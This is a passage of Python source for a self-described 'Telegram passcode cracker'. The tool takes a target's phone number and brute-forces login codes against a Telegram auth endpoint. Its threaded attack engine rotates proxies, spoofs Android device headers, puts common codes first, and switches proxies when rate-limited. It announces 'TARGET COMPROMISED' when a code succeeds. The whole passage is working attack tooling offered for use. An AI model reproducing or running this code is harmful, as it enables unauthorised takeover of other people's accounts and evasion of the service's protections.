            # If pool is exhausted, create a new session
            session = self._create_optimized_session()
            with self.lock:
                self.active_sessions += 1
            return session
    
    def return_session(self, session):
        """Return a session to the pool"""
        if session is None:
            logging.warning("Attempted to return None session to pool")
            with self.lock:
                self.active_sessions -= 1
            return
            
        try:
            # Clear any proxy configuration before returning
            if hasattr(session, 'proxies'):
                session.proxies.clear()
            self.session_pool.put(session, block=False)
            with self.lock:
                self.active_sessions -= 1
        except queue.Full:
            # If pool is full, close session
            session.close()
            with self.lock:
                self.active_sessions -= 1
        except Exception as e:
            logging.error(f"Error returning session to pool: {e}")
            with self.lock:
                self.active_sessions -= 1
    
    def shutdown(self):
        """Close all sessions and clean up"""
        count = 0
        while not self.session_pool.empty():
            try:
                session = self.session_pool.get(block=False)
                if session:
                    session.close()
                count += 1
            except queue.Empty:
                break
            except Exception as e:
                logging.error(f"Error closing session: {e}")
        logging.info(f"Session manager shutdown complete: closed {count} sessions")

# =====================
# ENHANCED UI DISPLAY
# =====================
class LiveDisplay:
    """Advanced real-time display with detailed statistics"""
    def __init__(self, stats, proxy_manager):
        self.stats = stats
        self.proxy_manager = proxy_manager
        self.console = Console()
        self.start_time = time.time()
        self.last_update = self.start_time
        self.update_interval = CONFIG.LIVE_STATS_INTERVAL
        self.termination_flag = False
        self.phone = None
        
        # For rich progress display
        self.progress = None
        self.task_id = None
        self.live = None
        
        # Start display thread
        self.display_thread = threading.Thread(target=self._display_thread, daemon=True)
        self.display_thread.start()
    
    def setup(self, phone):
        """Set up display with target phone number"""
        self.phone = phone
        
        try:
            # Create progress tracking
            self.progress = Progress(
                TextColumn("[bold blue]{task.description}"),
                BarColumn(bar_width=50),
                TextColumn("[bold]{task.percentage:>3.1f}%"),
                TextColumn("•"),
                TimeRemainingColumn()
            )
            self.task_id = self.progress.add_task("Attack Progress", total=self.stats.total)
            
            # Create live display
            self.live = Live(self._generate_display(), refresh_per_second=5)
            self.live.start()
            
            logging.info("Advanced UI display initialized")
        except Exception as e:
            logging.error(f"Error setting up display: {e}")
            # Fall back to basic display
            self._update_console()
    
    def _generate_display(self):
        """Generate rich display layout"""
        # If not initialized yet
        if not self.progress or self.task_id is None:
            return Panel("Initializing display...")
        
        # Update progress
        self.progress.update(self.task_id, completed=self.stats.attempted)
        
        # Create main table
        table = Table(show_header=False, box=True, expand=True)
        table.add_column("Key", style="cyan", width=20)
        table.add_column("Value", style="white")
        
        # Add stats rows
        table.add_row("Target Phone", f"[bold]{self.phone}[/bold]")
        table.add_row("Progress", f"{self.stats.attempted:,}/{self.stats.total:,} ([bold]{self.stats.attempted/max(1, self.stats.total):.1%}[/bold])")
        table.add_row("Speed", f"[bold]{self.stats.codes_ps:,}[/bold] attempts/sec (peak: {self.stats.peak_speed:,})")
        table.add_row("Active Threads", f"{self.stats.active_threads}/{CONFIG.MAX_THREADS}")
        table.add_row("ETA", f"[bold]{self.stats.get_eta()}[/bold]")
        table.add_row("Elapsed Time", f"{str(timedelta(seconds=int(time.time() - self.start_time)))}")
        table.add_row("Success/Fails", f"[green]{self.stats.success}[/green] successes | [red]{self.stats.proxy_fails}[/red] proxy fails")
        
        # Get proxy mode
        proxy_details = self.proxy_manager.get_proxy_details()
        direct_mode = proxy_details.get("direct_enabled", False)
        if direct_mode:
            proxy_info = f"[bold yellow]{self.stats.working_proxies}[/bold yellow]/{self.stats.total_proxies} [red](DIRECT MODE)[/red]"
        else:
            proxy_info = f"[bold]{self.stats.working_proxies}[/bold]/{self.stats.total_proxies} working"
        
        table.add_row("Proxies", proxy_info)
        table.add_row("Attack Efficiency", f"[bold]{self.stats.get_attack_efficiency():.1f}%[/bold]")
        
        # Add protocol stats if available
        if any(self.stats.protocol_stats.values()):
            proto_stats = []
            for proto, count in self.stats.protocol_stats.items():
                if count > 0:
                    proto_stats.append(f"{proto}: {count}")
            
            if self.stats.direct_connection_attempts > 0:
                proto_stats.append(f"direct: {self.stats.direct_connection_attempts}")
                
            if proto_stats:
                table.add_row("Protocol Usage", ", ".join(proto_stats))
        
        # System metrics
        try:
            import psutil
            cpu_usage = psutil.cpu_percent()
            mem_usage = psutil.virtual_memory().percent
            
            table.add_row("CPU Usage", f"{cpu_usage}% {'[red](HIGH)' if cpu_usage > 90 else ''}")
            table.add_row("Memory Usage", f"{mem_usage}% {'[red](HIGH)' if mem_usage > 90 else ''}")
        except ImportError:
            pass  # Skip if psutil not available
        
        # Main layout
        return Panel(
            self.progress,
            title=f"[bold red]TELEGRAM PASSCODE CRACKER v{CONFIG.VERSION}[/bold red]",
            subtitle="[bold yellow]LIVE ATTACK STATS[/bold yellow]"
        )
    
    def _display_thread(self):
        """Background thread for display updates"""
        while not self.termination_flag:
            try:
                self.update()
                time.sleep(self.update_interval)
            except Exception as e:
                logging.error(f"Display error: {e}")
    
    def update(self):
        """Update the display with latest stats"""
        now = time.time()
        if self.last_update + self.update_interval > now:
            return
            
        self.last_update = now
        try:
            self.proxy_manager.update_stats(self.stats)
            
            if self.live:
                try:
                    self.live.update(self._generate_display())
                except Exception as e:
                    logging.error(f"Error updating rich display: {e}")
                    # Fall back to basic console
                    self._update_console()
            else:
                self._update_console()
        except Exception as e:
            logging.error(f"Error updating display: {e}")
    
    def _update_console(self):
        """Fallback to basic console display"""
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            
            print(colored("=== TELEGRAM PASSCODE CRACKER - MILITARY GRADE ===", "cyan", attrs=["bold"]))
            print(f"Target: {self.phone}")
            print(f"Progress: {self.stats.attempted:,}/{self.stats.total:,} ({self.stats.attempted/max(1, self.stats.total):.1%})")
            print(f"Speed: {self.stats.codes_ps:,} attempts/second (peak: {self.stats.peak_speed:,})")
            print(f"Active Threads: {self.stats.active_threads}/{CONFIG.MAX_THREADS}")
            print(f"ETA: {self.stats.get_eta()}")
            print(f"Elapsed: {str(timedelta(seconds=int(time.time() - self.start_time)))}")
            
            # Proxy mode indicator
            proxy_details = self.proxy_manager.get_proxy_details()
            direct_mode = proxy_details.get("direct_enabled", False)
            if direct_mode:
                print(colored(f"Working Proxies: {self.stats.working_proxies}/{self.stats.total_proxies} (DIRECT MODE)", "yellow"))
            else:
                print(f"Working Proxies: {self.stats.working_proxies}/{self.stats.total_proxies}")
                
            print(f"Success: {self.stats.success} | Proxy Fails: {self.stats.proxy_fails}")
            print(f"Attack Efficiency: {self.stats.get_attack_efficiency():.1f}%")
            print(colored("------------------------------------------------", "cyan"))
        except Exception as e:
            logging.error(f"Error in console display: {e}")
    
    def close(self):
        """Clean shutdown of display"""
        self.termination_flag = True
        if self.live:
            try:
                self.live.stop()
            except:
                pass  # Ignore errors during shutdown

# =====================
# OPTIMIZED ATTACK ENGINE
# =====================
def attack_thread(phone, code, proxy_manager, stats, log_manager, session):
    """Optimized attack worker thread with multi-protocol support"""
    # Get a proxy from the manager
    proxy = proxy_manager.get_proxy()
    if not proxy:
        stats.update(proxy_fail=True)
        return False
    
    # Configure proxies based on proxy info
    if proxy.is_direct():
        proxies = None
        protocol = "direct"
        logging.debug("Using DIRECT connection")
    else:
        if not proxy.protocol:
            stats.update(proxy_fail=True)
            proxy_manager.mark_result(proxy, False)
            return False
            
        proxies = {
            "http": f"{proxy.protocol}://{proxy.host}:{proxy.port}",
            "https": f"{proxy.protocol}://{proxy.host}:{proxy.port}"
        }
        protocol = proxy.protocol
    
    try:
        # Configure session with proxies
        if session is not None:
            if proxies:
                session.proxies = proxies
            else:
                session.proxies = {}
            
            # Optimized request parameters
            params = {
                "phone": phone,
                "code": code,
                "device_model": f"Pixel-{random.randint(2, 6)}",
                "system_version": f"Android {random.randint(8, 13)}",
                "app_version": f"8.{random.randint(1, 9)}.{random.randint(0, 9)}",
                "lang_code": "en"
            }
            
            # Execute request with optimized timeout
            response = session.post(
                "https://api.telegram.org/auth",
                json=params,
                timeout=CONFIG.SOCKET_TIMEOUT,
                headers={
                    'User-Agent': f'TelegramAndroid/8.{random.randint(1, 9)}.{random.randint(0, 9)} (SDK {random.randint(24, 30)})',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive'
                }
            )
            
            # Process response
            if response.status_code == 200:
                # Success! Code cracked
                stats.update(success=True, protocol=protocol)
                log_manager.log_success(phone, code)
                if not proxy.is_direct():
                    proxy_manager.mark_result(proxy, True)
                
                # Signal success to main thread
                os.kill(os.getpid(), signal.SIGUSR1)
                return True
                
            elif response.status_code == 429:
                # Rate limiting - temporary proxy issue
                logging.debug(f"Rate limited on proxy {proxy}")
                stats.update(proxy_fail=True, protocol=protocol)
                if not proxy.is_direct():
                    proxy_manager.mark_result(proxy, False)
                return False
                
            elif response.status_code >= 500:
                # Server error - could be temporary
                logging.debug(f"Server error {response.status_code} on proxy {proxy}")
                stats.update(proxy_fail=True, protocol=protocol)
                if not proxy.is_direct():
                    proxy_manager.mark_result(proxy, False)
                return False
                
            else:
                # Other status - likely just wrong code
                stats.update(protocol=protocol)
                if not proxy.is_direct():
                    proxy_manager.mark_result(proxy, True)  # Proxy worked even if code wrong
                return False
        else:
            # Handle case where session is None
            logging.error("Attack thread received None session")
            stats.update(proxy_fail=True)
            return False
            
    except requests.exceptions.Timeout:
        logging.debug(f"Timeout with proxy {proxy}")
        stats.update(proxy_fail=True, protocol=protocol)
        if not proxy.is_direct():
            proxy_manager.mark_result(proxy, False)
        return False
        
    except requests.exceptions.ConnectionError:
        logging.debug(f"Connection error with proxy {proxy}")
        stats.update(proxy_fail=True, protocol=protocol)
        if not proxy.is_direct():
            proxy_manager.mark_result(proxy, False)
        return False
        
    except Exception as e:
        logging.warning(f"Attack error with proxy {proxy}: {str(e)[:100]}")
        stats.update(proxy_fail=True, protocol=protocol)
        if not proxy.is_direct():
            proxy_manager.mark_result(proxy, False)
        return False
    
    finally:
        # Always update stats
        stats.update()

# =====================
# ADVANCED ATTACK MANAGER
# =====================
class AttackManager:
    """Central manager for coordinating the attack operation"""
    def __init__(self, phone, codes, proxy_manager, log_manager, session_manager):
        self.phone = phone
        self.codes = codes
        self.proxy_manager = proxy_manager
        self.log_manager = log_manager
        self.session_manager = session_manager
        self.stats = AttackStats(len(codes))
        self.live_display = LiveDisplay(self.stats, self.proxy_manager)
        self.executor = ThreadPoolExecutor(max_workers=CONFIG.MAX_THREADS)
        self.running = True
        self.success = False
        self.code_queue = queue.Queue()
        self.futures = set()
        self.lock = threading.RLock()
        
        # Fill code queue with optimally ordered codes
        self._prepare_attack_codes()
        
        # Set up signal handlers
        signal.signal(signal.SIGUSR1, self._handle_success)
        signal.signal(signal.SIGINT, self._handle_interrupt)
    
    def _prepare_attack_codes(self):
        """Prepare and optimize code ordering for attack efficiency"""
        # Start with common patterns - this helps crack typical codes faster
        prioritized = []
        regular = []
        
        common_patterns = [
            # Common patterns based on research
            '123456', '111111', '000000', '123123', '123321', 
            '121212', '789456', '654321', '112233', '12345',
            '666666', '888888', '555555', '999999'
        ]
        
        for code in self.codes:
            if code in common_patterns:
                prioritized.append(code)
            elif len(set(code)) == 1:  # Repeated digits like 111111
                prioritized.append(code)
            elif code == ''.join(sorted(code)) and len(set(code)) == len(code):  # Sequential
                prioritized.append(code)
            else:
                regular.append(code)
        
        # Remove duplicates while preserving order
        all_codes = []
        seen = set()
        for code in prioritized + regular:
            if code not in seen:
                seen.add(code)
                all_codes.append(code)
        
        # Load into queue
        for code in all_codes:
            self.code_queue.put(code)
            
        logging.info(f"Prepared {len(all_codes)} codes for attack with {len(prioritized)} prioritized patterns")
    
    def _handle_success(self, signum, frame):
        """Signal handler for successful crack"""
        self.success = True
        self.running = False
        logging.info("Success signal received - stopping attack")
    
    def _handle_interrupt(self, signum, frame):
        """Signal handler for user interrupt (Ctrl+C)"""
        logging.info("Interrupt received - shutting down gracefully")
        self.running = False
    
    def _monitor_active_threads(self):
        """Monitor and manage active threads"""
        with self.lock:
            # Check completed futures
            done_futures = {f for f in self.futures if f.done()}
            self.futures -= done_futures
            
            # Calculate how many new threads we can start
            available_slots = CONFIG.MAX_THREADS - len(self.futures)
            return available_slots
    
    def start(self):
        """Start the attack operation"""
        self.live_display.setup(self.phone)
        
        logging.info(f"Starting attack on {self.phone} with {self.stats.total} codes")
        start_time = time.time()
        
        try:
            # Main attack loop
            while self.running and not self.code_queue.empty():
                # Check if we reached success
                if self.success:
                    break
                
                # Check how many threads we can spawn
                available_slots = self._monitor_active_threads()
                
                # Launch new threads up to max
                for _ in range(min(available_slots, self.code_queue.qsize())):
                    try:
                        code = self.code_queue.get_nowait()
                        session = self.session_manager.get_session()
                        
                        # Create a safer callback that handles None sessions
                        def safe_return_session(future, session=session):
                            try:
                                self.session_manager.return_session(session)
                            except Exception as e:
                                logging.error(f"Error in session return callback: {e}")
                        
                        future = self.executor.submit(
                            attack_thread,
                            self.phone, 
                            code,
                            self.proxy_manager,
                            self.stats,
                            self.log_manager,
                            session
                        )
                        
                        # Add completion callback with improved error handling
                        future.add_done_callback(safe_return_session)
                        
                        with self.lock:
                            self.futures.add(future)
                    except queue.Empty:
                        break
                    except Exception as e:
                        logging.error(f"Error launching attack thread: {e}")
                        if session:
                            self.session_manager.return_session(session)
                
                # Small sleep to prevent CPU spinning
                time.sleep(0.01)
                
                # Throttle if CPU usage too high
                try:
                    import psutil
                    if psutil.cpu_percent() > CONFIG.THROTTLE_CPU_THRESHOLD:
                        logging.warning(f"CPU usage high ({psutil.cpu_percent()}%), throttling attack")
                        time.sleep(0.5)
                except ImportError:
                    pass
            
            # Wait for completion with timeout
            logging.info("Waiting for threads to complete...")
            self.executor.shutdown(wait=True, cancel_futures=True)
            
        except KeyboardInterrupt:
            logging.info("Attack interrupted by user")
            self.running = False
        finally:
            # Clean shutdown
            duration = time.time() - start_time
            logging.info(f"Attack operation completed in {duration:.1f} seconds")
            self.live_display.close()
        
        # Final report
        if self.success:
            return True
        else:
            logging.info(f"Attack completed without success. Attempted {self.stats.attempted}/{self.stats.total} codes.")
            return False

# =====================
# UTILITIES
# =====================
def validate_phone(phone):
    """Validate phone number format"""
    if not phone.startswith('+'):
        raise ValueError("Phone number must start with + followed by country code")
    
    # Remove any spaces or dashes
    phone = ''.join(c for c in phone if c.isdigit() or c == '+')
    
    # Validate remaining characters
    if not phone[1:].isdigit():
        raise ValueError("Phone number must contain only digits after +")
    
    # Validate length (international standards)
    if not (7 <= len(phone) <= 15):
        raise ValueError("Phone number length invalid (must be 7-15 digits)")
    
    return phone

def load_passcodes():
    """Load and validate passcodes from file"""
    try:
        if not os.path.exists("numbers.txt"):
            logging.warning("numbers.txt not found! Creating a sample file.")
            with open("numbers.txt", "w") as f:
                f.write("# Add your passcodes here, one per line\n")
                f.write("123456\n111111\n000000\n")
                
        with open("numbers.txt") as f:
            codes = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
        
        if not codes:
            logging.error("FATAL: numbers.txt is empty!")
            sys.exit(1)
            
        # Validate and normalize codes
        valid_codes = []
        for code in codes:
            if code.isdigit():
                valid_codes.append(code)
            else:
                logging.warning(f"Skipping invalid code: {code}")
        
        if not valid_codes:
            logging.error("FATAL: No valid passcodes found in numbers.txt")
            sys.exit(1)
            
        # Remove duplicates while preserving order
        unique_codes = []
        seen = set()
        for code in valid_codes:
            if code not in seen:
                seen.add(code)
                unique_codes.append(code)
        
        logging.info(f"Loaded {len(unique_codes)} unique valid passcodes")
        return unique_codes
        
    except Exception as e:
        logging.error(f"Error loading passcodes: {str(e)}")
        sys.exit(1)

# =====================
# MAIN EXECUTION
# =====================
def main():
    """Main program execution flow"""
    # Display banner
    print(colored(f"""
  _____    _                                 _____                _             
 |_   _|  | |                               / ____|              | |            
   | | ___| | ___  __ _ _ __ __ _ _ __ ___ | |     _ __ __ _  ___| | _____ _ __
   | |/ _ \ |/ _ \/ _` | '__/ _` | '_ ` _ \| |    | '__/ _` |/ __| |/ / _ \ '__|
  _| |  __/ |  __/ (_| | | | (_| | | | | | | |____| | | (_| | (__|   <  __/ |   
 |_____\___|_|\___|\__, |_|  \__,_|_| |_| |_|\_____|_|  \__,_|\___|_|\_\___|_|   
                    __/ |                                                     
                   |___/         MILITARY GRADE EDITION v{CONFIG.VERSION}
    """, "red", attrs=["bold"]))
    
    # Initialize log manager first
    log_manager = LogManager()
    
    try:
        # Get target phone
        phone = input(colored("Enter target phone number (e.g., +201234567890): ", "yellow")).strip()
        phone = validate_phone(phone)
        
        # Initialize components
        codes = load_passcodes()
        proxy_manager = ProxyManager(log_manager)
        session_manager = SessionManager()
        
        # Initialize and start attack
        print(colored("\n[!] INITIALIZING ATTACK SYSTEM...", "yellow", attrs=["bold"]))
        attack = AttackManager(phone, codes, proxy_manager, log_manager, session_manager)
        
        print(colored("\n[!] INITIATING FULL-SCALE ATTACK...", "red", attrs=["bold"]))
        success = attack.start()
        
        # Report final status
        if success:
            print(colored("\n[+] ATTACK SUCCESSFUL - TARGET COMPROMISED", "green", attrs=["bold"]))
        else:
            print(colored("\n[-] ATTACK COMPLETED - NO VALID CODES FOUND", "yellow"))
        
        # Clean shutdown
        proxy_manager.shutdown()
        session_manager.shutdown()
        
    except ValueError as e:
        logging.error(f"Validation error: {str(e)}")
        print(colored(f"Error: {str(e)}", "red"))
        sys.exit(1)
    except KeyboardInterrupt:
        print(colored("\n\nAttack aborted by user.", "yellow"))
        sys.exit(0)
    except Exception as e:
        logging.error(f"Unhandled exception: {str(e)}")
        print(colored(f"\nUnexpected error: {str(e)}", "red"))
        sys.exit(1)

if __name__ == "__main__":
    main()
